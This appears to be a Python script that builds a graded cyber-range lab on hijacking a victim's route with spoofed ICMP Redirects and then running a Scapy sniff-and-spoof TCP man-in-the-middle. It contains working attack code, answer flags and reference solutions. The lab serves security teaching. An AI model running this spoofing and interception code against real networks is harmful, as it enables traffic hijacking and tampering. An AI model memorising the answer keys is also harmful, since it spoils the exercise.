#!/usr/bin/env python3
import json
import os

OUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "training.json")

def level(**kw):
    base = {
        "level_type": "TRAINING_LEVEL",
        "minimal_possible_solve_time": None,
        "answer_variable_name": None,
        "solution_penalized": True,
        "incorrect_answer_limit": 10,
        "attachments": [],
        "variant_answers": False,
        "reference_solution": [],
        "mitre_techniques": [],
        "expected_commands": [],
        "commands_required": False,
    }
    base.update(kw)
    return base

levels = []

# ---------------------------------------------------------------- Level 0
levels.append({
    "title": "Introduction",
    "level_type": "INFO_LEVEL",
    "order": 0,
    "estimated_duration": 0,
    "minimal_possible_solve_time": None,
    "content": (
        "# General information: please read carefully\n\n"
        "* The flag of a level is **required** to progress; levels build on each other.\n"
        "* If you get stuck, you may use the hints (each hint costs points - see its "
        "listed penalty) or consult course material.\n"
        "* This exercise is for educational purposes only, against your own lab "
        "sandbox. Unauthorized use of these techniques against real networks is illegal.\n\n"
        "# Scenario\n\n"
        "You are auditing a small office network for a client. Their workstation "
        "(`victim`, 10.9.0.5) normally reaches a partner's file-sharing network "
        "(`192.168.60.0/24`) through a legitimate router at `10.9.0.11`. "
        "Your task is to demonstrate, hands-on, that an attacker who can merely "
        "inject spoofed packets onto the victim's own LAN segment - without ever "
        "touching the real router - can hijack that route and then read and "
        "modify the victim's traffic.\n\n"
        "You control two machines: the **attacker** (10.9.0.105), from which you "
        "send spoofed packets, and the **malicious-router** (10.9.0.111), the "
        "machine you want the victim's traffic to actually flow through. You also "
        "have console access to the **victim**, the legitimate **router**, and the "
        "**target** machine on the partner network, so you can inspect what's "
        "happening on each side as you go."
    ),
})

# ---------------------------------------------------------------- Level 1
levels.append({
    "title": "Get Access",
    "level_type": "ACCESS_LEVEL",
    "order": 1,
    "estimated_duration": 0,
    "minimal_possible_solve_time": None,
    "passkey": "start",
    "cloud_content": (
        "Your first task is to access the sandbox where you will complete all "
        "following tasks. After you have successfully connected, submit the "
        "answer **`start`**.\n\n"
        "### Sandbox access\n"
        "1. In the topology overview on the right, you have five machines: "
        "`attacker`, `victim`, `malicious-router`, `router` and `target`. "
        "Right-click any of them and choose **`Open GUI`** to get a console.\n"
        "2. Log in to `attacker`, `victim`, `malicious-router` and `target` with "
        "username **`seed`** and password **`dees`**. Log in to `router` "
        "with the management account shown in its GUI panel.\n\n"
        "Alternatively, you can use SSH to connect to any machine - this makes it "
        "easier to copy-paste commands and flags. See "
        "[documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) "
        "for details."
    ),
    "local_content": "This sandbox has not been tested for use with a local sandbox.",
})

# ---------------------------------------------------------------- Level 2
levels.append(level(
    title="Recon: mapping the victim's current route",
    order=2,
    estimated_duration=5,
    answer="10.9.0.11",
    content=(
        "Before attacking anything, get a baseline. Open a console on the "
        "**victim** (10.9.0.5) and look at how it currently reaches the partner "
        "network `192.168.60.0/24`.\n\n"
        "Recall that Linux keeps two relevant structures: the **routing table** "
        "(static configuration, shown by `ip route`) and the **routing cache** "
        "(dynamic, shown by `ip route show cache`, and the thing ICMP redirects "
        "actually change). Right now the cache should be empty, and the table "
        "should show a legitimate gateway for `192.168.60.0/24`.\n\n"
        "The flag for this level is the IP address of the router the victim is "
        "currently configured to use to reach `192.168.60.0/24`."
    ),
    solution=(
        "```\nuser@victim:~$ ip route\ndefault via 10.9.0.1 dev eth0\n"
        "10.9.0.0/24 dev eth0 proto kernel scope link src 10.9.0.5\n"
        "192.168.60.0/24 via 10.9.0.11 dev eth0\n```"
    ),
    hints=[
        {
            "title": "Which command shows routing information?",
            "content": (
                "Use `ip route` for the static routing table, and "
                "`ip route get <ip>` to see which gateway would actually be "
                "used right now for a given destination."
            ),
            "hint_penalty": 0.5,
            "order": 0,
        }
    ],
    max_score=2,
    reference_solution=[
        {
            "state_name": "baseline_route_checked",
            "prereq_state": [],
            "cmd": "ip route",
            "cmd_type": "bash-command",
            "cmd_regex": "ip route( show)?$",
            "optional": False,
        }
    ],
))

# ---------------------------------------------------------------- Level 3
levels.append(level(
    title="Task 1: Spoof the ICMP Redirect",
    order=3,
    estimated_duration=15,
    answer=None,
    answer_variable_name="flag_task1",
    variant_answers=True,
    content=(
        "Time to attack. From the **attacker** machine (10.9.0.105), craft and "
        "send a spoofed ICMP Redirect that tells the victim to use "
        "**malicious-router** (10.9.0.111) as its gateway for "
        "`192.168.60.5`, instead of the legitimate router.\n\n"
        "A code skeleton is already on the attacker machine at "
        "`~/icmp-redirect-lab/icmp-redirect-skeleton.py` (fill in the `@@@@` "
        "placeholders). Remember:\n\n"
        "- The outer IP packet's source must be **spoofed as the legitimate "
        "router** (10.9.0.11) and its destination is the **victim**.\n"
        "- The ICMP message is a **Redirect** whose `gw` field is the "
        "**malicious-router**'s address.\n"
        "- The embedded `ip2` packet must resemble a packet the victim actually "
        "sent towards `192.168.60.5` recently - the Ubuntu kernel checks this "
        "before accepting the redirect. The simplest way to guarantee that: on "
        "the victim, start a `ping 192.168.60.5` (or `mtr -n 192.168.60.5`) "
        "running in a loop while you send your spoofed packet(s) from the "
        "attacker.\n\n"
        "Once you believe the attack worked, go to the **victim** and run "
        "`sudo /usr/local/sbin/check-flag1` - it inspects the routing cache "
        "and gives you the flag for this level if, and only if, the redirect "
        "really took effect. You can also inspect the cache yourself with "
        "`ip route show cache`, and clear it with `ip route flush cache` to "
        "retry from a clean state.\n\n"
        "The flag for this level is the string printed by `sudo /usr/local/sbin/check-flag1` on "
        "success."
    ),
    solution=(
        "```\n# on attacker:\nfrom scapy.all import *\n"
        "ip = IP(src='10.9.0.11', dst='10.9.0.5')\n"
        "icmp = ICMP(type=5, code=1)\n"
        "icmp.gw = '10.9.0.111'\n"
        "ip2 = IP(src='10.9.0.5', dst='192.168.60.5')\n"
        "send(ip/icmp/ip2/ICMP())\n\n"
        "# on victim, while/just after the above runs:\nping 192.168.60.5\n\n"
        "# verification, on victim:\nip route show cache\n"
        "192.168.60.5 via 10.9.0.111 dev eth0\n"
        "    cache <redirected> expires ...sec\n```"
    ),
    hints=[
        {
            "title": "Which ICMP type/code is a Redirect?",
            "content": (
                "ICMP Redirect messages use type 5. For 'Redirect Datagram "
                "for the Host' use code 1."
            ),
            "hint_penalty": 0.5,
            "order": 0,
        },
        {
            "title": "What should icmp.gw be, and what should the outer IP header look like?",
            "content": (
                "icmp.gw is the IP address you want the victim to start using "
                "as its next hop - that's the malicious router. The outer IP "
                "packet's source must be spoofed as the victim's current "
                "(legitimate) router, and its destination is the victim."
            ),
            "hint_penalty": 1,
            "order": 1,
        },
        {
            "title": "What goes inside ip2?",
            "content": (
                "The kernel only accepts the redirect if the embedded ip2 "
                "packet matches the type and destination of a packet the "
                "victim actually sent recently. Make ip2's source the victim "
                "and its destination the far-away host (192.168.60.5), and "
                "make sure the victim has just sent real traffic (e.g. a "
                "ping) to that destination."
            ),
            "hint_penalty": 1.5,
            "order": 2,
        },
    ],
    max_score=4,
    reference_solution=[
        {
            "state_name": "redirect_sent",
            "prereq_state": ["baseline_route_checked"],
            "cmd": "send(ip/icmp/ip2/ICMP())",
            "cmd_type": "bash-command",
            "cmd_regex": ".*ICMP\\(type=5.*",
            "optional": False,
        },
        {
            "state_name": "redirect_verified",
            "prereq_state": ["redirect_sent"],
            "cmd": "ip route show cache",
            "cmd_type": "bash-command",
            "cmd_regex": "ip route show cache",
            "optional": False,
        },
    ],
))

# ---------------------------------------------------------------- Level 4
levels.append(level(
    title="Question 1: Redirecting to a remote (off-subnet) host",
    order=4,
    estimated_duration=5,
    answer="on-link",
    content=(
        "Can you use an ICMP redirect to point the victim at a gateway that "
        "isn't even on the victim's local network? Try it: resend the attack "
        "with `icmp.gw` set to some IP address that is **not** part of "
        "`10.9.0.0/24` (e.g. a public IP, or 192.168.60.111). Check "
        "`ip route show cache` on the victim afterwards.\n\n"
        "You should find the cache is **unchanged** - the kernel silently "
        "ignores the redirect. The flag for this level is the one-word "
        "networking term (with the hyphen, lowercase) that describes the "
        "required relationship between a usable gateway address and the "
        "receiving interface's subnet - i.e. the property the kernel is "
        "checking for before it will ever use a new gateway."
    ),
    solution=(
        "An off-subnet `icmp.gw` is rejected: Linux only accepts a redirect's "
        "new gateway if it is **on-link** (directly reachable, same subnet) "
        "with respect to the interface the redirect arrived on. An attacker "
        "cannot use this technique to redirect the victim to an arbitrary "
        "remote machine, only to another host on the victim's own LAN segment."
    ),
    hints=[
        {
            "title": "Is the gateway's location checked?",
            "content": (
                "Linux validates that a new gateway offered via ICMP "
                "Redirect is directly reachable (on the same subnet) from "
                "the interface that received the redirect, before it will "
                "ever use it - regardless of whether the destination itself "
                "is local or remote."
            ),
            "hint_penalty": 0.5,
            "order": 0,
        }
    ],
    max_score=1,
))

# ---------------------------------------------------------------- Level 5
levels.append(level(
    title="Question 2: Redirecting to a non-existent local host",
    order=5,
    estimated_duration=5,
    answer="blackhole",
    content=(
        "Now try `icmp.gw` set to an address that IS on `10.9.0.0/24`, but "
        "that belongs to no running machine (e.g. `10.9.0.250`). Check "
        "`ip route show cache` on the victim: this time the cache **does** "
        "update, because the on-link check passes.\n\n"
        "Then try to actually reach `192.168.60.5` from the victim again. "
        "What happens to that traffic now?\n\n"
        "The flag for this level is the one-word networking term (lowercase) "
        "for a route that silently swallows traffic because nothing answers "
        "at the configured next hop."
    ),
    solution=(
        "The cache entry is created (the gateway is on-link, so the kernel's "
        "check passes) but no host exists at that address, so ARP never "
        "resolves it and every subsequent packet to `192.168.60.5` is "
        "silently dropped - a routing **blackhole**. Unlike Question 1, this "
        "redirect is syntactically 'successful' but makes the destination "
        "unreachable rather than intercepted."
    ),
    hints=[
        {
            "title": "What happens after the cache accepts a nonexistent gateway?",
            "content": (
                "The subnet check passes (it's a local address), so the "
                "cache entry is created - but nothing is actually listening "
                "at that address, so the kernel can never resolve its MAC "
                "address via ARP."
            ),
            "hint_penalty": 0.5,
            "order": 0,
        }
    ],
    max_score=1,
))

# ---------------------------------------------------------------- Level 6
levels.append(level(
    title="Question 3: Does send_redirects matter here?",
    order=6,
    estimated_duration=7,
    answer="no effect",
    content=(
        "On `malicious-router`, three sysctls are currently set:\n\n"
        "```\nnet.ipv4.conf.all.send_redirects=0\n"
        "net.ipv4.conf.default.send_redirects=0\n"
        "net.ipv4.conf.eth0.send_redirects=0\n```\n\n"
        "Flip all three to `1` (`sysctl -w net.ipv4.conf.all.send_redirects=1` "
        "etc. on `malicious-router`), then re-run your Task 1 attack from the "
        "**attacker** machine again (you may need `ip route flush cache` on "
        "the victim first to start from a clean slate).\n\n"
        "Does changing these values on malicious-router affect the outcome of "
        "your attack? The flag is exactly the two words `no effect` if it "
        "makes no difference, or `has effect` if it does."
    ),
    solution=(
        "It has **no effect**. `send_redirects` only controls whether the "
        "Linux kernel *itself* emits an ICMP Redirect when it is genuinely "
        "forwarding a packet sub-optimally. Your attack never asks the "
        "kernel to generate anything - scapy builds and injects a raw, "
        "fully-formed ICMP packet directly onto the wire from user space, "
        "completely bypassing that code path. This sysctl is meant to "
        "protect a machine from leaking topology information via redirects "
        "it would otherwise generate; it cannot stop an attacker who crafts "
        "their own redirect packets."
    ),
    hints=[
        {
            "title": "What layer is scapy operating at?",
            "content": (
                "Scapy builds and injects raw IP/ICMP packets directly; it "
                "doesn't ask the kernel to generate an ICMP Redirect on your "
                "behalf."
            ),
            "hint_penalty": 0.5,
            "order": 0,
        },
        {
            "title": "What does send_redirects actually gate?",
            "content": (
                "net.ipv4.conf.*.send_redirects only controls whether the "
                "Linux kernel itself emits a redirect when IT is genuinely "
                "forwarding packets slightly suboptimally; it has no say "
                "over redirects injected by a separate program via raw "
                "sockets."
            ),
            "hint_penalty": 1,
            "order": 1,
        },
    ],
    max_score=2,
))

# ---------------------------------------------------------------- Level 7
levels.append(level(
    title="Task 2 setup: disable forwarding, find the service",
    order=7,
    estimated_duration=7,
    answer=None,
    answer_variable_name="nc_port",
    variant_answers=True,
    content=(
        "You've shown you can redirect the victim's traffic through "
        "`malicious-router`. Right now that machine simply **forwards** the "
        "traffic on to the real destination (IP forwarding is enabled) - a "
        "passive relay. To actually modify traffic in flight you need to stop "
        "being a transparent router and start being a sniff-and-spoof MITM.\n\n"
        "1. On `malicious-router`, disable IP forwarding: "
        "`sysctl net.ipv4.ip_forward=0`.\n"
        "2. On `target` (192.168.60.5), a small TCP listener is already "
        "running, behaving like `nc -lk -p <port>` (everything a client sends "
        "is recorded in a root-protected log). Find out which "
        "port it is listening on by opening a console on `target` and "
        "reading the file in its lab working directory.\n\n"
        "The flag for this level is that port number."
    ),
    solution=(
        "```\n# on malicious-router:\nsysctl net.ipv4.ip_forward=0\n\n"
        "# on target:\ncat ~/icmp-redirect-lab/service_port.txt\n```"
    ),
    hints=[
        {
            "title": "Where is the port documented?",
            "content": (
                "Open a console on the target machine (192.168.60.5) and "
                "look in the lab's working directory for a file naming the "
                "port."
            ),
            "hint_penalty": 0.5,
            "order": 0,
        },
        {
            "title": "How do you turn off forwarding?",
            "content": "sysctl net.ipv4.ip_forward=0, run on malicious-router.",
            "hint_penalty": 1,
            "order": 1,
        },
    ],
    max_score=2,
    reference_solution=[
        {
            "state_name": "forwarding_disabled",
            "prereq_state": ["redirect_verified"],
            "cmd": "sysctl net.ipv4.ip_forward=0",
            "cmd_type": "bash-command",
            "cmd_regex": "sysctl .*net\\.ipv4\\.ip_forward=0",
            "optional": False,
        }
    ],
))

# ---------------------------------------------------------------- Level 8
levels.append(level(
    title="Task 2: Execute the MITM and redact the traffic",
    order=8,
    estimated_duration=20,
    answer=None,
    answer_variable_name="flag_task2",
    variant_answers=True,
    content=(
        "Now perform the full Man-in-the-Middle attack. A sample sniff-and-"
        "spoof program is already on `malicious-router` at "
        "`~/icmp-redirect-lab/mitm-sample.py`; it rebuilds each captured TCP "
        "packet, strips the stale checksums and payload, substitutes a new "
        "payload, and re-sends it - but you must finish it:\n\n"
        "1. Read `~/icmp-redirect-lab/secret_word.txt` (same word is also on "
        "the victim) and update the script to replace that word with the "
        "**same number** of `A` characters (get the length exactly right, or "
        "you will desync the TCP sequence numbers and break the connection "
        "entirely).\n"
        "2. Fix the capture filter. As written, the sample captures *all* "
        "TCP traffic on the interface, including the packets it re-injects "
        "itself - which would make it reprocess its own output forever. "
        "Narrow the filter so it only captures what it actually needs "
        "(Questions 4 and 5, right after this level, walk through exactly "
        "why and how).\n"
        "3. Run your finished script on `malicious-router`.\n"
        "4. From the `victim`, connect to the target "
        "(`nc 192.168.60.5 <port from Task 2 setup>`) and send a line "
        "containing the secret word (see `secret_word.txt`).\n"
        "5. On `target`, run `sudo /usr/local/sbin/check-flag2` - it "
        "checks the protected traffic log and gives you the flag only if the word "
        "arrived correctly redacted (and the raw word never arrived at "
        "all).\n\n"
        "The flag for this level is the string printed by `sudo /usr/local/sbin/check-flag2` "
        "on success."
    ),
    solution=(
        "```\n# on malicious-router:\nSECRET = b'<secret_word>'\n"
        "REPLACEMENT = b'A' * len(SECRET)\n\n"
        "def spoof_pkt(pkt):\n"
        "    newpkt = IP(bytes(pkt[IP]))\n"
        "    del newpkt.chksum\n"
        "    del newpkt[TCP].payload\n"
        "    del newpkt[TCP].chksum\n"
        "    if pkt[TCP].payload:\n"
        "        data = pkt[TCP].payload.load\n"
        "        newdata = data.replace(SECRET, REPLACEMENT)\n"
        "        send(newpkt/newdata)\n"
        "    else:\n"
        "        send(newpkt)\n\n"
        "sniff(iface='eth0', filter='tcp and ether src <victim_mac> and dst port <port>',\n"
        "      prn=spoof_pkt)\n\n"
        "# on victim:\nnc 192.168.60.5 <port>\nhello <secret_word> there\n\n"
        "# on target:\nsudo /usr/local/sbin/check-flag2\n```"
    ),
    hints=[
        {
            "title": "Which direction?",
            "content": (
                "You only need to see traffic going from the victim towards "
                "the target - that's the direction carrying the word you "
                "must redact."
            ),
            "hint_penalty": 1,
            "order": 0,
        },
        {
            "title": "IP or MAC in the filter?",
            "content": (
                "Think about what source address your own re-injected "
                "packets will carry once you've rewritten and resent them, "
                "and whether that could make your sniffer re-capture its own "
                "output."
            ),
            "hint_penalty": 1.5,
            "order": 1,
        },
        {
            "title": "What does the forwarding code need to look like?",
            "content": (
                "Rebuild the packet with IP(bytes(pkt[IP])), delete the "
                "stale checksums (del newpkt.chksum, del "
                "newpkt[TCP].chksum) and the old payload before attaching "
                "the modified one, then send() it - see mitm-sample.py on "
                "this machine for the full skeleton."
            ),
            "hint_penalty": 2,
            "order": 2,
        },
    ],
    max_score=5,
    reference_solution=[
        {
            "state_name": "mitm_running",
            "prereq_state": ["forwarding_disabled"],
            "cmd": "sniff(iface='eth0', filter='tcp', prn=spoof_pkt)",
            "cmd_type": "bash-command",
            "cmd_regex": ".*sniff\\(iface=.*prn=spoof_pkt.*",
            "optional": False,
        },
        {
            "state_name": "mitm_verified",
            "prereq_state": ["mitm_running"],
            "cmd": "sudo /usr/local/sbin/check-flag2",
            "cmd_type": "bash-command",
            "cmd_regex": "sudo /usr/local/sbin/check-flag2",
            "optional": False,
        },
    ],
))

# ---------------------------------------------------------------- Level 9
levels.append(level(
    title="Question 4: Which direction do you need to capture?",
    order=9,
    estimated_duration=5,
    answer="victim-to-target",
    content=(
        "Your MITM program only strictly needs to capture traffic travelling "
        "in **one** direction. Which one, and why?\n\n"
        "The flag is exactly `victim-to-target` if that's the direction you "
        "need, or `target-to-victim` otherwise."
    ),
    solution=(
        "Only **victim-to-target** traffic needs to be captured and "
        "rewritten: that's the direction carrying the netcat client's typed "
        "lines, which is the only place the secret word appears. The "
        "target's replies back to the victim don't contain anything you "
        "need to alter, and capturing/resending them too only adds "
        "unnecessary load and more opportunities for the sniffer to "
        "re-capture its own re-injected traffic."
    ),
    hints=[
        {
            "title": "Which side sends the word?",
            "content": (
                "The secret word travels in the netcat client's (the "
                "victim's) outgoing data, not in anything the target sends "
                "back."
            ),
            "hint_penalty": 0.5,
            "order": 0,
        }
    ],
    max_score=1,
))

# ---------------------------------------------------------------- Level 10
levels.append(level(
    title="Question 5: Filter by IP or by MAC address?",
    order=10,
    estimated_duration=7,
    answer="mac",
    content=(
        "When narrowing the capture filter to the victim's traffic, you can "
        "match on the victim's **IP address** or on the victim's **MAC "
        "address**. Both sound reasonable, but try both in turn (watch what "
        "`mitm-sample.py` prints for each) and use the result to pick the "
        "correct one.\n\n"
        "The flag is exactly `ip` or `mac` (lowercase)."
    ),
    solution=(
        "The correct choice is **MAC**. When your script re-injects a "
        "modified packet with `newpkt = IP(bytes(pkt[IP]))`, it preserves "
        "the *original* IP header - meaning the re-sent packet still has "
        "the victim's IP address as its source, even though it is now being "
        "sent out by malicious-router. A filter on the victim's **IP "
        "address** will therefore also match your own re-injected packet, "
        "causing the script to capture, 're-modify' (acting on already-"
        "redacted data) and resend it again, in a feedback loop. A filter on "
        "the victim's **MAC address** avoids this entirely, because the "
        "packet malicious-router sends out carries malicious-router's own "
        "MAC address at the link layer, not the victim's."
    ),
    hints=[
        {
            "title": "What happens to the source IP of your re-sent packet?",
            "content": (
                "newpkt = IP(bytes(pkt[IP])) keeps the ORIGINAL IP header, "
                "including the victim's source IP address - so the packet "
                "you re-inject still looks, at the IP layer, like it came "
                "from the victim."
            ),
            "hint_penalty": 1,
            "order": 0,
        },
        {
            "title": "Compare the two filters' behaviour side by side",
            "content": (
                "If you filter on the victim's IP address, your own "
                "re-sent packet (which still has the victim's source IP) "
                "matches your own filter and gets processed again. "
                "Filtering on the victim's source MAC address does not have "
                "this problem, because the packet you send out carries "
                "malicious-router's own MAC address at the link layer."
            ),
            "hint_penalty": 1.5,
            "order": 1,
        },
    ],
    max_score=2,
))

total_score = sum(l.get("max_score", 0) for l in levels if l.get("level_type") == "TRAINING_LEVEL")
assert total_score == 20, f"total score is {total_score}, expected 20"

total_duration = sum(l.get("estimated_duration", 0) for l in levels)

training = {
    "title": "ICMP Redirect & MITM Attack Lab",
    "description": (
        "System Security TP: hijacking a victim's route with a spoofed ICMP "
        "Redirect, then performing a full sniff-and-spoof TCP MITM attack - "
        "adapted from the SEED Labs 'ICMP Redirect Attack Lab' "
        "(Wenliang Du, CC BY-NC-SA 4.0)."
    ),
    "prerequisites": [
        "Basic TCP/IP and ICMP knowledge",
        "Comfort with the Linux command line",
        "Basic Python (the attack scripts use Scapy)",
    ],
    "outcomes": [
        "You will be able to forge an ICMP Redirect message with Scapy and use it "
        "to hijack a victim's route to a given destination.",
        "You will understand the routing-table vs. routing-cache distinction and "
        "the on-link validation that limits where an attacker can redirect traffic.",
        "You will be able to carry out a sniff-and-spoof TCP MITM attack that "
        "modifies data in flight without breaking the TCP sequence numbers.",
    ],
    "state": "UNRELEASED",
    "show_stepper_bar": True,
    "levels": levels,
    "estimated_duration": total_duration,
    "variant_sandboxes": True,
}

with open(OUT, "w") as f:
    json.dump(training, f, indent=1, ensure_ascii=False)
    f.write("\n")

print("total_score =", total_score)
print("total_duration =", total_duration)
print("wrote", OUT)
